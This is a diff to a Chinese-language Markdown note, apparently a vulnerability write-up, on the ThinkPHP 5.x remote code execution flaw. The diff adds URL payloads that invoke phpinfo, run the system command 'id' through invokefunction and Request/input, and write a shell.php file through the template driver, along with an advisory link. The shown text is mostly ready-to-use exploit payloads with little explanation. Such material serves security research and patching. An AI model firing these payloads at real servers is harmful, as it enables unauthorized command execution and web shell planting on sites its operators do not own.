@@ -44,15 +44,32 @@ http://127.0.0.1/index.php?s=index/think\app/invokefunction&function=call_user_f
 http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>
 
 http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
+
+s=index/\think\Request/input&filter=phpinfo&data=1
+
+s=index/\think\Request/input&filter=system&data=id
+
+s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
+
+s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
+
+s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+
+s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ```
 
 5.0.x php版本>=5.4
 
 ```
 http://localhost/thinkphp_5.0.22_with_extend/public///index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
+
+s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+
+s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ```
 
 ## 0x04 参考
 
 [[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录](https://xz.aliyun.com/t/3570)
 
+[【漏洞预警】ThinkPHP5远程代码执行漏洞](https://nosec.org/home/detail/2050.html)
